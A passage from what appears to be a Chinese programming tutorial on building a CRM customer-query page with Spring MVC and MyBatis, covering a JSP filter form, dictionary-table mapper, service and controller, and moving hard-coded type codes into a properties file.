        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;*.action&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;



&lt;h2&gt;5.1. &lt;strong&gt;需求分析&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711223004372-2056867604.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;页面效果如上图，在查询客户的时候，可以选择客户来源&lt;/span&gt;,&lt;span&gt;所属行业&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;客户级别信息&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;页面加载时需要&lt;/span&gt;初始化查询条件下拉列表。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;前端&lt;/span&gt;jsp&lt;span&gt;逻辑&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;form &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;form-inline&quot;&lt;/span&gt;&lt;span&gt; action&lt;/span&gt;&lt;span&gt;=&quot;${pageContext.request.contextPath }/customer/list.action&quot;&lt;/span&gt;&lt;span&gt; method&lt;/span&gt;&lt;span&gt;=&quot;get&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;form-group&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;label &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt;=&quot;customerName&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;客户名称&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;label&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt; 
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;input &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;text&quot;&lt;/span&gt;&lt;span&gt; class&lt;/span&gt;&lt;span&gt;=&quot;form-control&quot;&lt;/span&gt;&lt;span&gt; id&lt;/span&gt;&lt;span&gt;=&quot;customerName&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;${custName }&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;custName&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;form-group&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;label &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt;=&quot;customerFrom&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;客户来源&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;label&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt; 
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;form-control&quot;&lt;/span&gt;&lt;span&gt; id&lt;/span&gt;&lt;span&gt;=&quot;customerFrom&quot;&lt;/span&gt;&lt;span&gt; placeholder&lt;/span&gt;&lt;span&gt;=&quot;客户来源&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;custSource&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;option &lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;=&quot;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;--请选择--&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;option&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;c:forEach &lt;/span&gt;&lt;span&gt;items&lt;/span&gt;&lt;span&gt;=&quot;${fromType}&quot;&lt;/span&gt;&lt;span&gt; var&lt;/span&gt;&lt;span&gt;=&quot;item&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;option &lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;=&quot;${item.dict_id}&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;c:if test&lt;/span&gt;&lt;span&gt;=&quot;${item.dict_id == custSource}&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt; selected&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;c:if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&amp;gt;${item.dict_item_name }&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;option&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;c:forEach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;form-group&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;label &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt;=&quot;custIndustry&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;所属行业&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;label&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt; 
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;form-control&quot;&lt;/span&gt;&lt;span&gt; id&lt;/span&gt;&lt;span&gt;=&quot;custIndustry&quot;&lt;/span&gt;&lt;span&gt;  name&lt;/span&gt;&lt;span&gt;=&quot;custIndustry&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;option &lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;=&quot;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;--请选择--&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;option&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;c:forEach &lt;/span&gt;&lt;span&gt;items&lt;/span&gt;&lt;span&gt;=&quot;${industryType}&quot;&lt;/span&gt;&lt;span&gt; var&lt;/span&gt;&lt;span&gt;=&quot;item&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;option &lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;=&quot;${item.dict_id}&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;c:if test&lt;/span&gt;&lt;span&gt;=&quot;${item.dict_id == custIndustry}&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt; selected&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;c:if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&amp;gt;${item.dict_item_name }&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;option&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;c:forEach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;form-group&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;label &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt;=&quot;custLevel&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;客户级别&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;label&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;form-control&quot;&lt;/span&gt;&lt;span&gt; id&lt;/span&gt;&lt;span&gt;=&quot;custLevel&quot;&lt;/span&gt;&lt;span&gt; name&lt;/span&gt;&lt;span&gt;=&quot;custLevel&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;option &lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;=&quot;&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;--请选择--&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;option&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;c:forEach &lt;/span&gt;&lt;span&gt;items&lt;/span&gt;&lt;span&gt;=&quot;${levelType}&quot;&lt;/span&gt;&lt;span&gt; var&lt;/span&gt;&lt;span&gt;=&quot;item&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
                &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;option &lt;/span&gt;&lt;span&gt;value&lt;/span&gt;&lt;span&gt;=&quot;${item.dict_id}&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;c:if test&lt;/span&gt;&lt;span&gt;=&quot;${item.dict_id == custLevel}&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt; selected&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;c:if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&amp;gt;${item.dict_item_name }&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;option&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;c:forEach&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;button &lt;/span&gt;&lt;span&gt;type&lt;/span&gt;&lt;span&gt;=&quot;submit&quot;&lt;/span&gt;&lt;span&gt; class&lt;/span&gt;&lt;span&gt;=&quot;btn btn-primary&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;查询&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;button&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;form&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;按照&lt;/span&gt;jsp&lt;span&gt;的要求&lt;/span&gt;,&lt;span&gt;把对应的数据查询出来&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;放到模型中。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;数据存放在&lt;/span&gt;base_dict&lt;span&gt;表，可以使用&lt;/span&gt;dict_type_code&lt;span&gt;类别代码进行查询&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;使用需要获取的数据如下图：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711223039195-321666579.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;使用的&lt;/span&gt;sql:&lt;/p&gt;
&lt;p&gt;SELECT * FROM base_dict WHERE dict_type_code = '001'&lt;/p&gt;

&lt;h2&gt;5.2. &lt;strong&gt;&lt;span&gt;实现&lt;/span&gt;DAO&lt;span&gt;开发&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3&gt;5.2.1. &lt;strong&gt;pojo&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;因为页面显示的名字是下划线方式，和数据库表列名一样，根据页面的样式，编写&lt;/span&gt;pojo&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; BaseDict {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String dict_id;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String dict_type_code;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String dict_type_name;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String dict_item_name;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String dict_item_code;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer dict_sort;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String dict_enable;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String dict_memo;
get&lt;/span&gt;/&lt;span&gt;set。。。。。。
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;5.2.2. &lt;strong&gt;Mapper&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;编写BaseDictMapper&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; BaseDictMapper {
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 根据类别代码查询数据
     * 
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; dictTypeCode
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
     &lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    List&lt;/span&gt;&amp;lt;BaseDict&amp;gt;&lt;span&gt; queryBaseDictByDictTypeCode(String dictTypeCode);
    
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;5.2.3. &lt;strong&gt;Mapper.xml&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;编写&lt;/span&gt;BaseDictMapper.xml&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; &lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE mapper
PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;
&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mapper &lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt;=&quot;cn.itcast.crm.mapper.BaseDictMapper&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 根据类别代码查询数据 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;queryBaseDictByDictTypeCode&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;String&quot;&lt;/span&gt;&lt;span&gt;
        resultType&lt;/span&gt;&lt;span&gt;=&quot;cn.itcast.crm.pojo.BaseDict&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        SELECT * FROM base_dict WHERE dict_type_code =
        #{dict_type_code}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;mapper&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;5.3. &lt;strong&gt;&lt;span&gt;实现&lt;/span&gt;Service&lt;span&gt;开发&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3&gt;5.3.1. &lt;strong&gt;BaseDictService&lt;/strong&gt; &lt;strong&gt;&lt;span&gt;接口&lt;/span&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; BaseDictService {

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 根据类别代码查询
     * 
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; dictTypeCode
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
     &lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    List&lt;/span&gt;&amp;lt;BaseDict&amp;gt;&lt;span&gt; queryBaseDictByDictTypeCode(String dictTypeCode);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;5.3.2. &lt;strong&gt;BaseDictServiceImpl&lt;/strong&gt; &lt;strong&gt;&lt;span&gt;实现类&lt;/span&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Service
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; BaseDictServiceImpl &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; BaseDictService {

    @Autowired
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; BaseDictMapper baseDictMapper;

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;BaseDict&amp;gt;&lt;span&gt; queryBaseDictByDictTypeCode(String dictTypeCode) {

        List&lt;/span&gt;&amp;lt;BaseDict&amp;gt; list = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.baseDictMapper.queryBaseDictByDictTypeCode(dictTypeCode);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; list;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;5.4. &lt;strong&gt;&lt;span&gt;实现&lt;/span&gt;Controller&lt;span&gt;开发&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3&gt;5.4.1. &lt;strong&gt;&lt;span&gt;修改之前编写的&lt;/span&gt;controller&lt;/strong&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Controller
@RequestMapping(&lt;/span&gt;&quot;customer&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CustomerController {

    @Autowired
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; BaseDictService baseDictService;

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 显示客户列表
     * 
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
     &lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @RequestMapping(&lt;/span&gt;&quot;list&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String queryCustomerList(Model model) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 客户来源&lt;/span&gt;
        List&amp;lt;BaseDict&amp;gt; fromType = &lt;span&gt;this&lt;/span&gt;.baseDictService.queryBaseDictByDictTypeCode(&quot;002&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 所属行业&lt;/span&gt;
        List&amp;lt;BaseDict&amp;gt; industryType = &lt;span&gt;this&lt;/span&gt;.baseDictService.queryBaseDictByDictTypeCode(&quot;001&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 客户级别&lt;/span&gt;
        List&amp;lt;BaseDict&amp;gt; levelType = &lt;span&gt;this&lt;/span&gt;.baseDictService.queryBaseDictByDictTypeCode(&quot;006&quot;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 把前端页面需要显示的数据放到模型中&lt;/span&gt;
        model.addAttribute(&quot;fromType&quot;&lt;span&gt;, fromType);
        model.addAttribute(&lt;/span&gt;&quot;industryType&quot;&lt;span&gt;, industryType);
        model.addAttribute(&lt;/span&gt;&quot;levelType&quot;&lt;span&gt;, levelType);

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;customer&quot;&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;5.4.2. &lt;strong&gt;效果&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;实现效果如下图：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711223347273-489295861.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h3&gt;5.4.3. &lt;strong&gt;硬编码问题&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;这里是根据dict_type_code&lt;span&gt;类别代码查询数据，这里的查询条件是写死的，有硬编码问题。可以把类别代码提取到配置文件中，再使用&lt;/span&gt;@value&lt;span&gt;注解进行加载。&lt;/span&gt;&lt;/p&gt;
&lt;h4&gt;5.4.3.1. &lt;strong&gt;&lt;span&gt;添加&lt;/span&gt;env.properties&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span&gt;添加&lt;/span&gt;env.properties&lt;span&gt;配置文件&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#客户来源
CUSTOMER_FROM_TYPE&lt;/span&gt;=002&lt;span&gt;
#客户行业
CUSTOMER_INDUSTRY_TYPE&lt;/span&gt;=001&lt;span&gt;
#客户级别
CUSTOMER_LEVEL_TYPE&lt;/span&gt;=006
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;5.4.3.2. &lt;strong&gt;&lt;span&gt;修改&lt;/span&gt;springmvc.xml&lt;span&gt;配置文件&lt;/span&gt;&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;springmvc.xml&lt;span&gt;中加载&lt;/span&gt;&lt;span&gt;env.properties&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 加载controller需要的配置信息 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;context:property-placeholder &lt;/span&gt;&lt;span&gt;location&lt;/span&gt;&lt;span&gt;=&quot;classpath:env.properties&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;注意&lt;/span&gt;:Controller&lt;span&gt;需要的配置文件信息必须添加到&lt;/span&gt;&lt;span&gt;springmvc&lt;/span&gt;&lt;span&gt;的配置文件中&lt;/span&gt;&lt;/p&gt;

&lt;h4&gt;5.4.3.3. &lt;strong&gt;&lt;span&gt;修改&lt;/span&gt;Controller&lt;span&gt;方法&lt;/span&gt;&lt;/strong&gt;&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Controller
@RequestMapping(&lt;/span&gt;&quot;customer&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CustomerController {

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 客户来源&lt;/span&gt;
    @Value(&quot;${CUSTOMER_FROM_TYPE}&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String CUSTOMER_FROM_TYPE;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 客户行业&lt;/span&gt;
    @Value(&quot;${CUSTOMER_INDUSTRY_TYPE}&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String CUSTOMER_INDUSTRY_TYPE;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 客户级别&lt;/span&gt;
    @Value(&quot;${CUSTOMER_LEVEL_TYPE}&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String CUSTOMER_LEVEL_TYPE;

    @Autowired
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; BaseDictService baseDictService;

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 显示客户列表
     * 
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
     &lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @RequestMapping(&lt;/span&gt;&quot;list&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String queryCustomerList(Model model) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 客户来源&lt;/span&gt;
        List&amp;lt;BaseDict&amp;gt; fromType = &lt;span&gt;this&lt;/span&gt;.baseDictService.queryBaseDictByDictTypeCode(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CUSTOMER_FROM_TYPE);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 所属行业&lt;/span&gt;
        List&amp;lt;BaseDict&amp;gt; industryType = &lt;span&gt;this&lt;/span&gt;.baseDictService.queryBaseDictByDictTypeCode(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CUSTOMER_INDUSTRY_TYPE);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 客户级别&lt;/span&gt;
        List&amp;lt;BaseDict&amp;gt; levelType = &lt;span&gt;this&lt;/span&gt;.baseDictService.queryBaseDictByDictTypeCode(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CUSTOMER_LEVEL_TYPE);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 把前端页面需要显示的数据放到模型中&lt;/span&gt;
